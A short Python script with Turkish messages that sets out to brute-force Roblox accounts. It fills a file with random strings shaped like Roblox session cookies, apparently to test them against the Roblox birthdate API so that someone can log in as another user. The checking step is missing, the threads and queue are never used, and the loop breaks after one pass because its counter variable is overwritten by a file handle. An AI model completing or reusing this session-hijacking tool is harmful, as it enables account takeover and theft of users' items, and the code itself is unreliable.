import requests
import re
import string
import os
import threading
import random
import time
from queue import Queue

print('tarafindan kodlandi: MRX();#3621, Ben bestim! \n')
print('begenirseniz sevinirim.')

outputfile = open("cookies.txt", "a")

x = 0
cookies = []
intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
n = 0
print('[yuksek deger secersen bulma olasilikin o kadar artar]')
c = int(input("ne kadar yaratim kardesime? \n"))
print('rastgele deger yaratiliyor sabirli ol! \n')
print('(bu islem brute forceye dayali')
print('hesap bulma olasilikin cok dusuk ama yok degil ) \n')
letters = 'ABCDEF'

while x < c:


    cookies =  intro +  ''.join(random.choices(letters + string.digits, k=732))

    x = x + 1
    
    c = open('Cookies.txt', "a+")
    c.write(f'{cookies}\n')
    c.close()
    

if __name__ == '__main__':

    number_of_threads = 900
    print_lock = threading.Lock()
    cookie_queue = Queue()
    url = 'https://accountinformation.roblox.com/v1/birthdate'

        
    cookie_queue.join()

outputfile.close()

t1 = time.time()
print('tarama tamamlandi birsey bulunduysa cookies.txtye kaydetcem')
input("cikmak icin enter bas.")




 
